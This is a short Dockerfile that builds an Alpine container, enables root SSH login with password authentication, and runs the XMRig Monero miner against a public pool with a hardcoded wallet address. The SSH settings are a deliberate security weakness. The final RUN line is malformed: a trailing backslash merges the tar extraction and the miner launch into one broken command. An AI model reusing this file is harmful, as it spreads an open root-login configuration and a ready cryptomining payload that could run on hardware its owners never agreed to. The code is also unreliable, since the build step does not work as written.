FROM alpine:latest

VOLUME [ "/src" ]
WORKDIR /src
COPY ./xmrig-6.18.0-linux-static-x64.tar.gz /src

RUN apk add --no-cache --update bash openssh iproute2 tcpdump net-tools screen
RUN echo "UseDNS no" >> /etc/ssh/sshd_config && \
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

ARG VERSION=6.18.0

RUN tar zxvf xmrig-6.18.0-linux-static-x64.tar.gz -C /src/ \
./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 466rMXjH3VcW9qUSVjjkdXREYLGvBd2RwVg295Z7jrMJTnSzQbGbpgSEWpomVV7FNnikzDkYf7Fs4EVQRviBuPQD1ofi4Ck -k --tls -p Rin
